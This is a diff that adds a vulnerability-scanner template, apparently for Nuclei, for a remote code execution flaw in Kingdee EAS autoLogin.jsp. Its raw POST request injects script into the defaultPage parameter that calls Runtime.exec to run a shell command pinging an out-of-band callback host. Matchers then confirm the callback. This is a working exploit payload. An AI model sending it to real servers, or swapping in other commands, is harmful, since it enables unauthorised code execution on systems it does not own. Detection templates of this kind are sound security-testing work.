@@ -1,0 +1,32 @@
+id: Apusic-EAS-autoLogin-rce
+
+info:
+  name: 金蝶EAS autoLogin.jsp远程代码执行漏洞
+  author: EAS
+  severity: critical
+  tags: EAS
+
+http:
+  - raw:
+      - |
+        POST /easportal/autoLogin.jsp HTTP/1.1
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+        Content-Type: application/x-www-form-urlencoded
+        Host: {{Hostname}}
+        Connection: close
+
+        defaultPage=/autoLogin.jsp?defaultPage=/BIReport&json=1);var cc=new Array('/bin/sh', '-c', 'ping -c 1 http://{{interactsh-url}}/');java.lang.Runtime.getRuntime().exec(cc);//
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains(interactsh_protocol, 'http') || contains(interactsh_protocol, 'dns')"
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{message:"
